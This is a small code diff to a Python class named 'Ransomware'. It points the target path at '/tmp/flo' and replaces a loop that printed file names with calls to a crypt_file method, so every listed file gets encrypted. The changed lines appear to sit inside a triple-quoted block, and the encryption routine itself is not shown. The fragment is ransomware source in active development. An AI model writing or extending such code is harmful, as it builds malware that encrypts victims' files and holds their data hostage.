@@ -73,7 +73,7 @@ class Ransomware:
                 abs_file_path = os.path.join(tmp, f)
 
         """   
-        path ="/tmp"
+        path ="/tmp/flo"
         #we shall store all the file names in this list
         filelist = []
 
@@ -84,7 +84,7 @@ class Ransomware:
 
         #print all the file names
         for name in filelist:
-            print(name)
+            self.crypt_file(name, encrypted=encrypted)
                         
 
         """
